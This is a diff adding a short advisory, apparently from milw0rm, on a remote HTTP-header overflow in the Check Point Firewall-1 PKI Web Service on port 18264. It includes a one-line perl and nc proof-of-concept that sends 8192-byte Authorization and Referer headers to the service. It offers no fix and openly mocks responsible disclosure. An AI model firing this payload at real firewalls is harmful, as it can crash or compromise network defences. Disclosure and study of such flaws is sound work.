@@ -1,0 +1,33 @@
+- Check Point Firewall-1 PKI Web Service HTTP Header Remote Overflow
+
+- Description
+
+The Check Point Firewall-1 PKI Web Service, running by default on TCP
+port 18264, is vulnerable to a remote overflow in the handling of very
+long HTTP headers. This was discovered during a pen-test where the
+client would not allow further analysis and would not provide the full
+product/version info. Initial testing indicates the 'Authorization'
+and 'Referer' headers were vulnerable.
+
+- Product
+
+Check Point, Firewall-1, unknown
+
+- PoC
+
+perl -e 'print "GET / HTTP/1.0\r\nAuthorization: Basic" . "x" x 8192 .
+"\r\nFrom: bugs@hugs.com\r\nIf-Modified-Since: Fri, 13 Dec 2006
+09:12:58 GMT\r\nReferer: http://www.owasp.org/" . "x" x 8192 .
+"\r\nUserAgent: FsckResponsibleDisclosure 1.0\r\n\r\n"' | nc
+suckit.com 18264
+
+- Solution
+
+None
+
+- Timeline
+
+2006-11-06: Vulnerability Discovered
+2009-03-29: Disclosed to Public
+
+# milw0rm.com [2009-03-30]
